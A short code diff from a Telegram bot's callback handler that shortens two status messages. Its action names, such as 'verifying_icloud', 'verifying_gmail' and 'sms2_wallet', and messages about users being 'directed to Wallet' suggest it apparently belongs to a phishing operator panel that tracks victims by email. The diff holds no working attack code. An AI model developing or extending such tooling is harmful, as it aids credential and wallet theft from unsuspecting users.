@@ -336,9 +336,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "verifying_wallet") {
         statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
       } else if (action === "verifying_icloud") {
-        statusMessage = `📧 <code>${email}</code> → ☁️<b>iCloud</b>☁️`;
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
       } else if (action === "verifying_gmail") {
-        statusMessage = `📧 <code>${email}</code> → 🌈<b>Gmail</b>🌈`;
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
       } else if (action === "sms2_wallet") {
         statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
       } else if (action === "sms2_done") {
